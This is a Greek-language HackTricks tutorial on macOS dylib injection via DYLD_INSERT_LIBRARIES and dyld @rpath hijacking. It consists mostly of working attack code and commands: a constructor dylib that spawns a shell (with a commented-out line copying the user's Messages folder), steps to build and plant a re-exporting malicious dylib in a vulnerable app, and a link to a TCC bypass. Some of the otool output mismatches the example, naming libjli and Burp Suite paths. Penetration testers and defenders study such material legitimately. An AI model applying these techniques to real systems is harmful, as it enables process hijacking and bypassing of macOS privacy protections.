# macOS Διασπορά Dyld & DYLD\_INSERT\_LIBRARIES

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικό παράδειγμα DYLD\_INSERT\_LIBRARIES

**Βιβλιοθήκη για ενσωμάτωση** για την εκτέλεση ενός κέλυφους:
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
//system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
Δυαδικός κώδικας για επίθεση:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Έγχυση:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Παράδειγμα Dyld Hijacking

Το ευάλωτο δυαδικό αρχείο που επιθυμούμε να εκμεταλλευτούμε είναι το `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.

{% tabs %}
{% tab title="entitlements" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>
{% endtab %}

{% tab title="LC_RPATH" %}
{% code overflow="wrap" %}
```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib2 (offset 12)
```
{% endcode %}
{% endtab %}

{% tab title="@rpath" %}
{% code overflow="wrap" %}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
name @rpath/lib.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
# Check the versions
```
{% endcode %}
{% endtab %}
{% endtabs %}

Με τις προηγούμενες πληροφορίες γνωρίζουμε ότι **δεν ελέγχει την υπογραφή των φορτωμένων βιβλιοθηκών** και προσπαθεί να φορτώσει μια βιβλιοθήκη από:

* `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
* `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

Ωστόσο, η πρώτη δεν υπάρχει:
```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
Έτσι, είναι δυνατόν να το αποκτήσουμε! Δημιουργήστε μια βιβλιοθήκη που **εκτελεί κάποιο αυθαίρετο κώδικα και εξάγει τις ίδιες λειτουργίες** με την νόμιμη βιβλιοθήκη, επανεξάγοντάς την. Και θυμηθείτε να την μεταγλωτίσετε με τις αναμενόμενες εκδόσεις:

{% code title="lib.m" %}
```objectivec
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
{% endcode %}

Το μεταγλωττίζουμε:

{% code overflow="wrap" %}
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
{% endcode %}

Η διαδρομή επανεξαγωγής που δημιουργείται στη βιβλιοθήκη είναι σχετική με τον φορτωτή, ας την αλλάξουμε σε απόλυτη διαδρομή για τη βιβλιοθήκη που θέλουμε να εξαγάγουμε:

{% code overflow="wrap" %}
```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
{% endcode %}

Τέλος, απλά αντιγράψτε το στην **καταχωρημένη τοποθεσία**:

{% code overflow="wrap" %}
```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
{% endcode %}

Και **εκτελέστε** το δυαδικό αρχείο και ελέγξτε αν η **βιβλιοθήκη φορτώθηκε**:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Usage: [...]
</code></pre>

{% hint style="info" %}
Μια καλή ανάλυση σχετικά με το πώς να εκμεταλλευτείτε αυτήν την ευπάθεια για να εκμεταλλευτείτε τα δικαιώματα της κάμερας του Telegram μπορεί να βρεθεί στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{% endhint %}

## Μεγαλύτερη Κλίμακα

Εάν σκοπεύετε να προσπαθήσετε να εισαγάγετε βιβλιοθήκες σε αναπάντεχα δυαδικά αρχεία, μπορείτε να ελέγξετε τα μηνύματα γεγονότων για να διαπιστώσετε πότε φορτώνεται η βιβλιοθήκη μέσα σε ένα διεργασία (σε αυτήν την περίπτωση αφαιρέστε την printf και την εκτέλεση `/bin/bash`).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
